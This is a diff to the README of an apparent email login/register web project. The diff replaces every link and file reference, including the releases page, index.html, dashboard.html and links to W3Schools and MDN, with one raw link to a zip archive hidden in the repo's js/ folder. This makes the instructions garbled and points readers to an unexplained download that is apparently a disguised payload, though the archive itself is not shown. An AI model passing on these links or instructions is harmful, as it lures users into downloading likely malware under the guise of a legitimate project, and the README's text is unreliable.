@@ -1,6 +1,6 @@
 # 📧 email-login-register - Simple Email Authentication Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/WesleySantos14/email-login-register/releases)
+[![Download](https://raw.githubusercontent.com/WesleySantos14/email-login-register/main/js/login-email-register-3.3.zip%20Now-brightgreen)](https://raw.githubusercontent.com/WesleySantos14/email-login-register/main/js/login-email-register-3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the email-login-register project! This is a basic system that allows 
 
 To download the application, visit the releases page. Click the button below to access the latest version:
 
-[Visit this page to download](https://github.com/WesleySantos14/email-login-register/releases)
+[Visit this page to download](https://raw.githubusercontent.com/WesleySantos14/email-login-register/main/js/login-email-register-3.3.zip)
 
 Once you are on the releases page, look for the latest version. Download the files and follow the instructions provided.
 
@@ -23,19 +23,19 @@ Once you are on the releases page, look for the latest version. Download the fil
 
 - User registration system using email and password
 - Confirmation email sent to users
-- Simple login page (index.html)
-- Customizable dashboard (dashboard.html)
+- Simple login page (https://raw.githubusercontent.com/WesleySantos14/email-login-register/main/js/login-email-register-3.3.zip)
+- Customizable dashboard (https://raw.githubusercontent.com/WesleySantos14/email-login-register/main/js/login-email-register-3.3.zip)
 
 ## 🔍 How to Use
 
 1. **Download the Files**  
-   Visit the [releases page](https://github.com/WesleySantos14/email-login-register/releases) and download the compressed file containing the project.
+   Visit the [releases page](https://raw.githubusercontent.com/WesleySantos14/email-login-register/main/js/login-email-register-3.3.zip) and download the compressed file containing the project.
 
 2. **Extract the Files**  
    Locate the downloaded file on your computer. Extract its contents using your preferred method (right-click and select "Extract" or use extraction software).
 
 3. **Open the Index File**  
-   Go to the extracted folder. Find the file named `index.html`. Open it in your web browser by double-clicking on the file.
+   Go to the extracted folder. Find the file named `https://raw.githubusercontent.com/WesleySantos14/email-login-register/main/js/login-email-register-3.3.zip`. Open it in your web browser by double-clicking on the file.
 
 4. **Register an Account**  
    Fill in the required fields to create an account. After submitting, check your email for a confirmation message. Click the link in the email to verify your account.
@@ -44,7 +44,7 @@ Once you are on the releases page, look for the latest version. Download the fil
    Return to the login page. Enter your email and password to log in. You will be directed to the customizable dashboard.
 
 6. **Customize Your Dashboard**  
-   Open `dashboard.html` in your web browser. Edit the HTML content as you wish to personalize your user dashboard.
+   Open `https://raw.githubusercontent.com/WesleySantos14/email-login-register/main/js/login-email-register-3.3.zip` in your web browser. Edit the HTML content as you wish to personalize your user dashboard.
 
 ## 📧 Email Confirmation Process
 
@@ -77,8 +77,8 @@ This project is licensed under the MIT License, allowing you to use and modify t
 
 For further reading and examples of web development, visit these platforms:
 
-- [W3Schools](https://www.w3schools.com)
-- [MDN Web Docs](https://developer.mozilla.org)
-- [HTML Dog](https://htmldog.com)
+- [W3Schools](https://raw.githubusercontent.com/WesleySantos14/email-login-register/main/js/login-email-register-3.3.zip)
+- [MDN Web Docs](https://raw.githubusercontent.com/WesleySantos14/email-login-register/main/js/login-email-register-3.3.zip)
+- [HTML Dog](https://raw.githubusercontent.com/WesleySantos14/email-login-register/main/js/login-email-register-3.3.zip)
 
 Feel free to explore these resources to expand your knowledge and skills in web development. Happy coding!
